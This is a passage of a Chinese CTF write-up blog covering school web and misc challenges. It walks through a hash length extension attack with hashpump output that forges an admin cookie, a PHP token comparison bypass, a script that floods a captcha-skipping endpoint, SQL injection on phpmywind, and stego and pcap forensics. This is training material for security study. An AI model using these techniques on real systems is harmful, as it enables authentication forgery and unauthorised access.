class="line">sum+=<span class="built_in">parseInt</span>(data[i])*second + data[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 请求flag</span></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:<span class="string">'param2.php?param='</span>+sum,</span><br><span class="line">method:<span class="string">'get'</span>,</span><br><span class="line">dataType:<span class="string">'json'</span>,</span><br><span class="line">success:<span class="function"><span class="keyword">function</span>(<span class="params">s</span>)</span>&#123;</span><br><span class="line">alert(s.f);</span><br><span class="line">&#125;,</span><br><span class="line">error:<span class="function"><span class="keyword">function</span>(<span class="params">s</span>)</span>&#123;</span><br><span class="line">alert(<span class="string">'错了'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="phpmywind"><a href="#phpmywind" class="headerlink" title="phpmywind"></a>phpmywind</h4><p>这个题目个考察的是phpmywind5.3的漏洞了<br>上网搜一波，发现大概存在两个漏洞前台sql注入及后台任意文件遍历<br>但是由于题目说flag从数据库里面找，那就肯定是注入的漏洞，但是这个题目有问题，直接flag就给出来了，有毛病。。。。<br><img src="https://s1.ax1x.com/2018/10/04/i8plp8.png" alt="i8plp8.png"><br>然后尝试复现一下，发现这学校搭的平台参数好像都不一样。。。。自己搭的平台是可以复现的。。。。。。<br>详细可以参考一下 <a href="http://www.logphp.com/?a=url&amp;k=430bac59&amp;u=aHR0cDovL3d3dy5iYWlkdS5jb20vbGluaz91cmw9bHRsdXdFNzhCYVN5YmFWVFhZUzEzSHFMTjVtTTV2SWg4bmlWb1o4Szg3T3hwNk83UWRGS0ZzcHlRbDJfWWNLQg==&amp;t=cGhwbXl3aW5kVjUuM!acgOaWsOa8j!a0nuWQiOmbhijliY3lj7BzcWzms6jlhaXlj4rlkI7lj7Dku7vmhI@mlofku7bpgY3ljoYpIC0gLi4u&amp;s=cGhwbXl3aW5kNS4zIOa8j!a0ng==" target="_blank" rel="noopener">这篇文章</a><br>我们直接用报错注入就可以了</p><h4 id="is-hash-safe"><a href="#is-hash-safe" class="headerlink" title="is hash safe??"></a>is hash safe??</h4><p>这题考的是hash长度拓展攻击<br>一开始抓包把cookie里面的<code>role</code>改为<code>admin</code>，发包一看还是没有反应，题目说有东西漏了，那么肯定是有备份文件，尝试<code>phps，php~</code>无果后尝试<code>.swp</code>出现代码了<br>我们可以用<code>vim -r</code>命令去回复备份文件<code>vim -r admin.php.swp</code><br>出现源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                $auth = <span class="keyword">false</span>;</span><br><span class="line">                $role = <span class="string">"guest"</span>;</span><br><span class="line">                $salt =<span class="string">"xxxxxxxxxxxxx"</span>;<span class="comment">//len:13</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>]))</span><br><span class="line">                &#123;</span><br><span class="line">                        $role = $_COOKIE[<span class="string">"role"</span>];</span><br><span class="line">                        $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">                        <span class="keyword">if</span> (stripos($role,<span class="string">"admin"</span>)!==<span class="keyword">false</span>&amp;&amp;$hsh === md5($salt.$_COOKIE[<span class="string">"role"</span>]))</span><br><span class="line">                        &#123;</span><br><span class="line">                                $auth = <span class="keyword">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                                $auth = <span class="keyword">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                        $s = $role;</span><br><span class="line">                        setcookie(<span class="string">'role'</span>,$s);</span><br><span class="line">                        $hsh = md5($salt.$s);</span><br><span class="line">                        setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin.Your flag is cumtctf&#123;you_know_this_is_not_the_flag&#125;"</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们可用<code>hashpump</code>这个工具来伪造<code>admin</code>的身份，记得要把数据URL编码一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# hashpump</span><br><span class="line">Input Signature: c70ab9d039f166c5b5f506a5698ebaa1</span><br><span class="line">Input Data: guest</span><br><span class="line">Input Key Length: 13</span><br><span class="line">Input Data to Add: admin</span><br><span class="line">37d0fe2c401a689be9608e9f850ef3de</span><br><span class="line">guest\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00admin</span><br></pre></td></tr></table></figure></p><p>发包即可得到flag<br><a href="https://imgchr.com/i/i8p0pT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/04/i8p0pT.md.png" alt="i8p0pT.md.png"></a></p><p>可以看一下我以前的<a href="https://0verwatch.top/hash-length-attack.html">文章</a></p><h4 id="logic"><a href="#logic" class="headerlink" title="logic"></a>logic</h4><p>这个题目个人感觉有脑洞，这个题目一上来抓包啥的都没有什么提示，就连题目需要的token也没找着，然后在查看源代码的时候才用脑洞发现的信息<br><a href="https://imgchr.com/i/i8pat0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/04/i8pat0.md.png" alt="i8pat0.md.png"></a><br>这里的<code>meta</code>的信息在对解题起了关键的作用，发现是<code>vim</code>编辑器编辑的，难么可能就有备份文件，尝试一下上一题的<code>swp</code>文件，果然有代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">如果登录邮箱地址不是管理员则 die()</span></span><br><span class="line"><span class="comment">数据库结构</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 表的结构 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CREATE TABLE IF NOT EXISTS `user` (</span></span><br><span class="line"><span class="comment">  `id` int(11) NOT NULL AUTO_INCREMENT,</span></span><br><span class="line"><span class="comment">  `username` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `email` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `token` int(255) NOT NULL DEFAULT '0',</span></span><br><span class="line"><span class="comment">  PRIMARY KEY (`id`)</span></span><br><span class="line"><span class="comment">) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 转存表中的数据 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES</span></span><br><span class="line"><span class="comment">(1, '****不可见***', '***不可见***', 0);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"失败了呀"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>关键绕过的代码是这一部分<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br></pre></td></tr></table></figure></p><p>我们了需要构造token等于0并且长度等于10，而且还要知道admin的邮箱</p><p>这又需要脑洞了，我们又可以从meta信息里面得到admin是<code>chenyurui</code>，邮箱是<code>gmail</code>，自己够早一波邮箱地址 就是<a href="mailto:`chenyurui@gmail.com" target="_blank" rel="noopener">`chenyurui@gmail.com</a><code>，然后token输入</code>0000000000`就可以得到flag了</p><h4 id="淘金"><a href="#淘金" class="headerlink" title="淘金"></a>淘金</h4><p>这个题在抢钱的时候就会输出一个验证码让你输入，在5秒之内如果没输入正确的验证码就不能抢，如果输入正确的话就会访问一个<code>dorob.php</code>的页面，我们现在的方法就相当于直接跳过验证码检验的这一步直接访问这个页面就会直接达到抢劫的目的，但是一定得在5秒以内，不然是抢不到的，这就相当于编写代码的人没对验证码进行严格的限制从而导致逻辑错误。。<br>这个过程我们可以不断对那个页面发包，然后抢劫某一个人的金币即可，就会发现很明显回显异样<br><a href="https://imgchr.com/i/i8Q5nA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/05/i8Q5nA.md.png" alt="i8Q5nA.md.png"></a></p><p>然后我们可以模拟这个过程即可，写了个脚本，就从前面三个最有钱的人里面抢吧<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://202.119.201.199/challenge/web/robber/rob.php?id=109'</span></span><br><span class="line">url_rob = <span class="string">'http://202.119.201.199/challenge/web/robber/dorob.php'</span></span><br><span class="line">url2 = <span class="string">'http://202.119.201.199/challenge/web/robber/rob.php?id=103'</span></span><br><span class="line">url3 = <span class="string">'http://202.119.201.199/challenge/web/robber/rob.php?id=58'</span></span><br><span class="line"></span><br><span class="line">headers =&#123;</span><br><span class="line"><span class="string">'Referer'</span>: <span class="string">'http://202.119.201.199/challenge/web/robber/rob.php?id=109'</span>,</span><br><span class="line"><span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line"><span class="string">'Host'</span>: <span class="string">'202.119.201.199'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0'</span>,</span><br><span class="line">     <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">     <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line"><span class="string">'PHPSESSID'</span>:<span class="string">'kupr8ubqffdcpsstn21mp6bhv0'</span>, </span><br><span class="line"><span class="string">'ssid'</span>:<span class="string">'ef260780a098d5fcb1185bca69db366d'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'user'</span>:<span class="string">'EddieIvan'</span>,</span><br><span class="line"><span class="string">'num'</span>:<span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line">data2 =&#123;</span><br><span class="line"><span class="string">'user'</span>:<span class="string">'altman'</span>,</span><br><span class="line"><span class="string">'num'</span>:<span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line">data3 = &#123;</span><br><span class="line"><span class="string">'user'</span>:<span class="string">'小明'</span>,</span><br><span class="line"><span class="string">'num'</span>:<span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">ans1 = requests.get(url,cookies=cookies)</span><br><span class="line">ans2 = requests.post(url_rob,data=data,cookies=cookies,headers=headers)</span><br><span class="line">ans1 = requests.get(url2,cookies=cookies)</span><br><span class="line">ans2 = requests.post(url_rob,data=data2,cookies=cookies,headers=headers)</span><br><span class="line">ans1 = requests.get(url3,cookies=cookies)</span><br><span class="line">ans2 = requests.post(url_rob,data=data3,cookies=cookies,headers=headers)</span><br><span class="line">time.sleep(<span class="number">4.7</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Waiting'</span></span><br></pre></td></tr></table></figure></p><p>当你的金币高于1000的时候就可以点击购买flag的那个页面就可以了得到flag了</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h4><p>这个题目考察的是对LSB这个东西的熟悉程度。我们用神器StegSolve来看一下里面究竟最低位里面藏了什么东西<br>可以看到在最低位的那一部分发现了一张图片保存发现是一张二维码<br><a href="https://imgchr.com/i/ilHS6f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHS6f.md.jpg" alt="ilHS6f.md.jpg"></a><br>扫一扫就可以得到flag了<br><img src="https://s1.ax1x.com/2018/09/30/ilHpX8.jpg" alt="ilHpX8.jpg"></p><h4 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h4><p>在属性里面发现了这样的一句话<br><img src="https://s1.ax1x.com/2018/09/30/ilHCnS.jpg" alt="ilHCnS.jpg"><br>不管先有没有用先记录一下<br>然后去kali里面把这个图片binwalk一下发现里面存在一个压缩包，把他分离出来<br><a href="https://imgchr.com/i/ilHi7Q" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHi7Q.md.jpg" alt="ilHi7Q.md.jpg"></a></p><p>然后打开里面的压缩包，发现加密了，这正好想起刚才的那一串文字，然后输入进去发现可以解开并得到flag<br><a href="https://imgchr.com/i/ilHkkj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHkkj.md.jpg" alt="ilHkkj.md.jpg"></a></p><h4 id="视而不见"><a href="#视而不见" class="headerlink" title="视而不见"></a>视而不见</h4><p>这个题目也是应用了StegSolve这个工具，因为一开始发现这张图片好像是被拉伸了一样，所以果断放进去<br>利用里面的stereogram Solver在偏移量为104的时候就出现flag了<br><a href="https://imgchr.com/i/ilHEhn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHEhn.md.jpg" alt="ilHEhn.md.jpg"></a></p><h4 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy crypto"></a>easy crypto</h4><p>这个题目有两个文件，先把其中的摩斯密码给解密得到另一串字符串<br><code>keyisvigenerecipher</code><br>这就相当于给了我们提示维吉尼亚密码<br>然后我们就去在线网页上解码，而且给出了key是<code>vigenerecipher</code>然后我们用那一串密文尝试解密得到flag<br><a href="https://imgchr.com/i/ilHZpq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHZpq.md.jpg" alt="ilHZpq.md.jpg"></a></p><h4 id="我就想试试这个名字到底能够起多长"><a href="#我就想试试这个名字到底能够起多长" class="headerlink" title="我就想试试这个名字到底能够起多长"></a>我就想试试这个名字到底能够起多长</h4><p>这个题目也要用到StegSolve，毕竟这东西在图片隐写里面经常使用<br>跟上面有一题很类似的操作也是去看看最低位隐藏了什么信息<br>然后可以发喜那里面放了一个压缩包保存下来打开就好<br><a href="https://imgchr.com/i/ilHe10" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHe10.md.jpg" alt="ilHe10.md.jpg"></a><br>在kali里面打开并使用strings命令查看有哪些可见字符，发现flag<br><img src="https://s1.ax1x.com/2018/09/30/ilHnXT.jpg" alt="ilHnXT.jpg"></p><h4 id="你的石锅拌饭"><a href="#你的石锅拌饭" class="headerlink" title="你的石锅拌饭"></a>你的石锅拌饭</h4><p>这一个题目偏脑洞，因为题目说了有培根这东西，从而可以联想到培根密码，这里面的正体代表的是A，斜体代表的是B，以此推出密文为下面的一串东西，<code>ABAAAABABBABBBABABABAABAABAABAAABBAAAAABAABAB</code><br>因为题目说了密文是大写，因此这里我们全都是大写，然后在线解密就可以得到flag了<br><img src="https://s1.ax1x.com/2018/09/30/ilHKnU.jpg" alt="ilHKnU.jpg"></p><h4 id="鲨鱼的套路"><a href="#鲨鱼的套路" class="headerlink" title="鲨鱼的套路"></a>鲨鱼的套路</h4><p> 这个题目一打开协议分析里面发现tcp流量特别多<br><a href="https://imgchr.com/i/ilHMBF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHMBF.md.png" alt="ilHMBF.md.png"></a></p><p>过滤tcp流量看一下，然后追踪tcp流看一下，发现有一段base64解码发现存在pk头，导出来另存为压缩包<br><a href="https://imgchr.com/i/ilH1AJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilH1AJ.md.png" alt="ilH1AJ.md.png"></a></p><p><a href="https://imgchr.com/i/ilHJ91" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHJ91.md.png" alt="ilHJ91.md.png"></a><br>然后发现压缩包有加密<br>于是打开看一下是否是伪加密，当然这里我们可以根据这个压缩包文件里面看到的文件名的提示，从16进编辑器中看到很明显全局没有加密，说明肯定是伪加密，我们只需要把09改为00即可<br><a href="https://imgchr.com/i/ilHcgP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHcgP.md.png" alt="ilHcgP.md.png"></a></p><p>得到flag<br><img src="https://s1.ax1x.com/2018/09/30/ilHNjK.png" alt="ilHNjK.png"></p><h4 id="萌萌哒"><a href="#萌萌哒" class="headerlink" title="萌萌哒"></a>萌萌哒</h4><p>这个题目就是考察几种不同的编码方式而已<br>首先是js混淆，我们直接放进控制台跑一下就发现另外的一个文件<br><a href="https://imgchr.com/i/ilHBAH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHBAH.png" alt="ilHBAH.png"></a><br>然后进去之后发现是一堆brainfuck编码<br>去这个网站解码一下<br><a href="http://tool.bugku.com/brainfuck/" target="_blank" rel="noopener">http://tool.bugku.com/brainfuck/</a><br>得到另外的一个经过Ook编码的的东西，再解码一下<br><a href="https://imgchr.com/i/ilHr4A" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHr4A.md.png" alt="ilHr4A.md.png"></a><br>得到flag<br><img src="https://s1.ax1x.com/2018/09/30/ilH63t.png" alt="ilH63t.png"></p><h4 id="shark"><a href="#shark" class="headerlink" title="shark"></a>shark</h4><p>同样的操作用wireshark先分析一下协议，发现ftp协议特别多，然后追踪一波ftp<br><a href="https://imgchr.com/i/ilHRu8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHRu8.md.png" alt="ilHRu8.md.png"></a></p><p>然后再追踪tcp流发现这里面是利用user账户登录ftp并且密码是<br><img src="https://s1.ax1x.com/2018/09/30/ilH4EQ.png" alt="ilH4EQ.png"><br>而且还在下面发现他下载了一个flag的压缩包，然后我们再过滤一下ftp-data，把数据流给保存起来，又发现这个压缩包是加密的，这次发现这个压缩包不是伪加密了，因为全局加密位是奇数，所以是肯定是需要密码的<br><img src="https://s1.ax1x.com/2018/09/30/ilbe5d.jpg" alt="ilbe5d.jpg"></p><p>尝试在包里面搜索关键字password没找到，只能尝试ftp登录密码，果然把文件给解压出了，但是放在HXD中查看有点异常因为里面存在IDHR这样的东西，明显是png图片的内容，文件却没有png文件的头部，找个png文件对比一下，发现头部果然被修改<br>正常是这样的<br><img src="https://s1.ax1x.com/2018/09/30/ilHbvV.png" alt="ilHbvV.png"><br>但现在是这样的<br><img src="https://s1.ax1x.com/2018/09/30/ilHLuT.png" alt="ilHLuT.png"><br>只需要修改几位即可，最后得开图片文件获得flag<br><a href="https://imgchr.com/i/ilHXbF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHXbF.md.png" alt="ilHXbF.md.png"></a></p><h4 id="学姐真美"><a href="#学姐真美" class="headerlink" title="学姐真美"></a>学姐真美</h4><p>根据提示发现应该是在图片里面做了手脚<br>用HXD打开一下，发现文件头部还在，但是发现后面一大堆东西东西都是00很奇怪，然后搜索一下jpg文件尾FFD9<br>发现了在jpg文件尾后面还存在这一个png图片的IHDR这东西可能后面是一个png图片，试着尝试把它抠出来对比一下真正的png文件另存为看一下是什么<br><a href="https://imgchr.com/i/ilHvE4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilHvE4.md.png" alt="ilHvE4.md.png"></a></p><p>把这一段改为正常的png文件头<br><img src="https://s1.ax1x.com/2018/09/30/ilHxUJ.png" alt="ilHxUJ.png"></p><p>发现是一个不完整的二维码，这牵扯到了图片的高度问题，在png里面的话IHDR后面的16位的东西就是分别改长和宽的，每组8位，把这一位改为FF<br><img src="https://s1.ax1x.com/2018/09/30/ilHz59.png" alt="ilHz59.png"><br>然后记得到完整的二维码了。扫码就可以得到flag<br><img src="https://s1.ax1x.com/2018/09/30/ilbpCR.png" alt="ilbpCR.png"></p><h4 id="魂斗罗"><a href="#魂斗罗" class="headerlink" title="魂斗罗"></a>魂斗罗</h4><p>这个游戏你有两种玩法，第一种就是你自己凭本事过关，第二张就是作弊，然后在网上找作弊，输入金手指，我输入的金手指<br><a href="https://imgchr.com/i/ilbCgx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilbCgx.md.png" alt="ilbCgx.md.png"></a><br>一关关下来就可以看到flag了<br><img src="https://s1.ax1x.com/2018/09/30/ilbFKK.png" alt="ilbFKK.png"><br>注意下flag的格式</p><h4 id="据说是一个签到题目"><a href="#据说是一个签到题目" class="headerlink" title="据说是一个签到题目"></a>据说是一个签到题目</h4><p>Wireshark打开协议分级，发现TCP下的data数据包十分之多，过滤一波看看，然后追踪流发现一段python代码，而且还在下方发现一段base64的代码<br><a href="https://imgchr.com/i/i8p2A1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/04/i8p2A1.md.png" alt="i8p2A1.md.png"></a><br><a href="https://imgchr.com/i/i8pRtx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/04/i8pRtx.md.png" alt="i8pRtx.md.png"></a></p><p>看一下代码发现加密解密函数都给你了，直接把flag里面的信息解码之后放进代码里面跑一下就可以直接出flag了，前提是要将密文base64解码一下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(encrypted, passphrase)</span>:</span></span><br><span class="line">  IV = encrypted[:<span class="number">16</span>]</span><br><span class="line">  aes = AES.new(passphrase, AES.MODE_CBC, IV)</span><br><span class="line">  <span class="keyword">return</span> aes.decrypt(encrypted[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># def encrypt(message, passphrase):</span></span><br><span class="line"><span class="comment">#   IV = message[:16]</span></span><br><span class="line"><span class="comment">#   length = 16</span></span><br><span class="line"><span class="comment">#   count = len(message)</span></span><br><span class="line"><span class="comment">#   padding = length - (count % length)</span></span><br><span class="line"><span class="comment">#   message = message + '\0' * padding</span></span><br><span class="line"><span class="comment">#   aes = AES.new(passphrase, AES.MODE_CBC, IV)</span></span><br><span class="line"><span class="comment">#   return aes.encrypt(message)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IV = <span class="string">'YUFHJKVWEASDGQDH'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># message = IV + 'flag is hctf&#123;xxxxxxxxxxxxxxx&#125;'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">'mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA=='</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print len(message)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># example = encrypt(message, 'Qq4wdrhhyEWe4qBF')</span></span><br><span class="line"><span class="comment"># print example</span></span><br><span class="line">ans =  base64.b64decode(flag)</span><br><span class="line">example = decrypt(ans, <span class="string">'Qq4wdrhhyEWe4qBF'</span>) </span><br><span class="line"><span class="keyword">print</span> 